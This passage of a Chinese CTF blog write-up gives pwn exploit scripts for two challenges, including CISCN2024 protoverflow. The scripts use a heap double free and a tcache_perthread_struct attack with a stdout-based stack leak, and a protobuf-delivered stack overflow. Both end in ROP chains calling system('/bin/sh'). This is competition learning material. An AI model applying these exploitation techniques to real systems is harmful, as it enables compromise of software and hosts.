- - - - - - - - - - - #<br>def <span class="hljs-built_in">pwn_exp</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;PWN&#x27;</span>)<br>    for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">9</span>):<br>        <span class="hljs-built_in">add</span>(i,<span class="hljs-number">8</span>*b<span class="hljs-string">&#x27;a&#x27;</span>)<br>    #利用原本就存在的small bin<br>    <span class="hljs-built_in">show</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,b<span class="hljs-string">&#x27;B&#x27;</span>*<span class="hljs-number">2</span>)<br>    <span class="hljs-built_in">ru</span>(<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br>    libc.address = <span class="hljs-built_in">u64_ex</span>(io.<span class="hljs-built_in">recv</span>(<span class="hljs-number">6</span>))-<span class="hljs-number">2206944</span><br>    <span class="hljs-built_in">free</span>(<span class="hljs-number">0</span>)<br>    <span class="hljs-built_in">show</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,b<span class="hljs-string">&#x27;B&#x27;</span>*<span class="hljs-number">2</span>)<br>    <span class="hljs-built_in">ru</span>(<span class="hljs-string">&#x27;Content:&#x27;</span>)<br>    heap_base = <span class="hljs-built_in">u64_ex</span>(io.<span class="hljs-built_in">recv</span>(<span class="hljs-number">5</span>))*<span class="hljs-number">0</span><span class="hljs-built_in">x1000-</span>(<span class="hljs-number">0</span>x55f6e06f1000-<span class="hljs-number">0</span>x55f6e06ef000)<br><br>    for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">7</span>):<br>        <span class="hljs-built_in">free</span>(i)<br>    #double free<br>    <span class="hljs-built_in">free</span>(<span class="hljs-number">7</span>)<br>    <span class="hljs-built_in">free</span>(<span class="hljs-number">8</span>)<br>    <span class="hljs-built_in">free</span>(<span class="hljs-number">7</span>)<br>    for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">7</span>):<br>        <span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>,b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>    #一次任意写<br>    #对tcache_perthread_struct进行攻击<br>    target = ((heap_base + <span class="hljs-number">0</span>x4e40)&gt;&gt;<span class="hljs-number">12</span>)^(heap_base+<span class="hljs-number">0</span>xf0)<br>    <span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">p64_ex</span>(target))<br>    <span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>,b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>    <span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>,b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>    <span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">p64_ex</span>(<span class="hljs-number">0</span>)+<span class="hljs-built_in">p64_ex</span>(heap_base+<span class="hljs-number">0</span>x10))<br>    <br>    p1 = <span class="hljs-built_in">p16_ex</span>(<span class="hljs-number">1</span>)*<span class="hljs-number">12</span><br>    p1 = p1.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">0</span>x80,b<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>    p1 += <span class="hljs-built_in">p64_ex</span>(heap_base+<span class="hljs-number">0</span>x10) + <span class="hljs-built_in">p64_ex</span>(heap_base+<span class="hljs-number">0</span>x10) + <span class="hljs-built_in">p64_ex</span>(libc.sym._IO_2_1_stdout_) + <span class="hljs-built_in">p64_ex</span>(heap_base+<span class="hljs-number">0</span>x2000) + <span class="hljs-built_in">p64_ex</span>(heap_base+<span class="hljs-number">0</span>xc0)+<span class="hljs-built_in">p64_ex</span>(heap_base+<span class="hljs-number">0</span>x2000)*<span class="hljs-number">5</span><br>    p1 = p1.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">0</span>xe0,b<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>    <span class="hljs-built_in">nop</span>(p1)<br><br>    p2 = <span class="hljs-built_in">p64_ex</span>(<span class="hljs-number">0</span>xFBAD1800) + <span class="hljs-built_in">p64_ex</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + <span class="hljs-built_in">p64_ex</span>(libc.sym.environ) + <span class="hljs-built_in">p64_ex</span>(libc.sym.environ+<span class="hljs-number">8</span>)<br>    p2 = p2.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">0</span>x30,b<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>    <span class="hljs-built_in">nop</span>(p2)<br><br>    stack = <span class="hljs-built_in">u64_ex</span>(io.<span class="hljs-built_in">recv</span>(<span class="hljs-number">6</span>)) + (<span class="hljs-number">0</span>x7ffec3e59d90-<span class="hljs-number">0</span>x7ffec3e59f28)+<span class="hljs-number">0</span>x108-<span class="hljs-number">0</span>xd0-<span class="hljs-number">0</span>x8<br>    log.<span class="hljs-built_in">success</span>(<span class="hljs-string">&#x27;stack:&#x27;</span>+<span class="hljs-built_in">hex</span>(stack))<br><br>    p3 = <span class="hljs-built_in">p64_ex</span>(stack)+<span class="hljs-built_in">p64_ex</span>(heap_base+<span class="hljs-number">0</span>x2000)*<span class="hljs-number">5</span><br>    p3 = p3.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">0</span>x50,b<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>    <span class="hljs-built_in">nop</span>(p3)<br><br>    CG.<span class="hljs-built_in">set_find_area</span>(find_in_elf=False,find_in_libc=True)<br>    <br>    p4 = b<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span> + <span class="hljs-built_in">p64_ex</span>(CG.<span class="hljs-built_in">ret</span>()) + <span class="hljs-built_in">p64_ex</span>(CG.<span class="hljs-built_in">pop_rdi_ret</span>())+<span class="hljs-built_in">p64_ex</span>(CG.<span class="hljs-built_in">bin_sh</span>())+<span class="hljs-built_in">p64_ex</span>(libc.sym.system)<br>    p4 = p4.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">0</span>x70,b<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>    <span class="hljs-built_in">nop</span>(p4)<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="CISCN2024-华中-protoverflow"><a href="#CISCN2024-华中-protoverflow" class="headerlink" title="CISCN2024 华中 protoverflow"></a>CISCN2024 华中 protoverflow</h3><p>开局送libc地址</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">printf(<span class="hljs-string">&quot;Gift: %p\n&quot;</span>, <span class="hljs-symbol">&amp;puts</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+<p>漏洞点,由 memcpy 造成的溢出</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">char dest<span class="hljs-selector-attr">[516]</span>; // <span class="hljs-selector-attr">[rsp+0h]</span> <span class="hljs-selector-attr">[rbp-210h]</span> BYREF<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/Lc10Cl/pic/raw/master/img/20240713141643370.png" srcset="/img/loading.gif" lazyload alt="image-20240713141642205"></p>
+<p>当时修的时候给直接改成了下面这种, 但是没防成功,后面看别的师傅的wp是跳转到了eh_frame段来控制size</p>
+<p><img src="https://gitee.com/Lc10Cl/pic/raw/master/img/20240713141805697.png" srcset="/img/loading.gif" lazyload alt="image-20240713141805006"></p>
+<p>使用pbtk可以恢复出来message.proto</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">syntax</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;proto2&quot;</span><span class="hljs-comment">;</span><br><br>message protoMessage &#123;<br>    optional string name <span class="hljs-operator">=</span> <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>    optional string phoneNumber <span class="hljs-operator">=</span> <span class="hljs-number">2</span><span class="hljs-comment">;</span><br>    required bytes buffer <span class="hljs-operator">=</span> <span class="hljs-number">3</span><span class="hljs-comment">;</span><br>    required uint32 size <span class="hljs-operator">=</span> <span class="hljs-number">4</span><span class="hljs-comment">;</span><br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>然后调试可以看到最后是将buffer直接向s处复制,大小为size</p>
+<p>exp</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">def send<span class="hljs-constructor">_msg(<span class="hljs-params">name</span>,<span class="hljs-params">phoneNumber</span>,<span class="hljs-params">buffer</span>,<span class="hljs-params">size</span>)</span>:<br>    msg = message_pb2.proto<span class="hljs-constructor">Message()</span><br>    msg.name = name<br>    msg.phoneNumber = phoneNumber<br>    msg.buffer = buffer<br>    msg.size = size<br>    return msg.<span class="hljs-constructor">SerializeToString()</span><br># - - - - - - - - - - - - - #<br><br># - - - - - - - - - - - - - #<br>def pwn<span class="hljs-constructor">_exp()</span>:<br>    print(&#x27;PWN&#x27;)<br>    ru(&#x27;Gift: &#x27;)<br>    puts_addr = <span class="hljs-built_in">int</span>(ru(<span class="hljs-character">&#x27;\n&#x27;</span>),<span class="hljs-number">16</span>)<br>    libc.address = puts_addr - libc.sym.puts<br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">CG</span>.</span></span>set<span class="hljs-constructor">_find_area(<span class="hljs-params">find_in_elf</span>=False,<span class="hljs-params">find_in_libc</span>=True)</span><br>    payload = b<span class="hljs-character">&#x27;C&#x27;</span>*(<span class="hljs-number">0x210</span>+<span class="hljs-number">8</span>)+p64<span class="hljs-constructor">_ex(CG.<span class="hljs-params">ret</span>()</span>)+p64<span class="hljs-constructor">_ex(CG.<span class="hljs-params">pop_rdi_ret</span>()</span>)+p64<span class="hljs-constructor">_ex(CG.<span class="hljs-params">bin_sh</span>()</span>)+p64<span class="hljs-constructor">_ex(<span class="hljs-params">libc</span>.<span class="hljs-params">sym</span>.<span class="hljs-params">system</span>)</span><br>    p = send<span class="hljs-constructor">_msg(<span class="hljs-params">b</span>&#x27;A&#x27;<span class="hljs-operator">*</span>0x10,<span class="hljs-params">b</span>&#x27;B&#x27;<span class="hljs-operator">*</span>0x10,<span class="hljs-params">payload</span>,<span class="hljs-params">len</span>(<span class="hljs-params">payload</span>)</span>)<br>    s(p)<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/pwn/" class="category-chain-item">pwn</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/pwn/" class="print-no-link">#pwn</a>
+      
+    </div>
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/07/14/llvm_zero/" title="LLVM_Zero">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">LLVM_Zero</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/05/03/DASCTF%20X%20GFCTF%202024%EF%BD%9C%E5%9B%9B%E6%9C%88%E5%BC%80%E5%90%AF%E7%AC%AC%E4%B8%80%E5%B1%80/" title="DASCTF X GFCTF 2024｜四月开启第一局">
+                        <span class="hidden-mobile">DASCTF X GFCTF 2024｜四月开启第一局</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
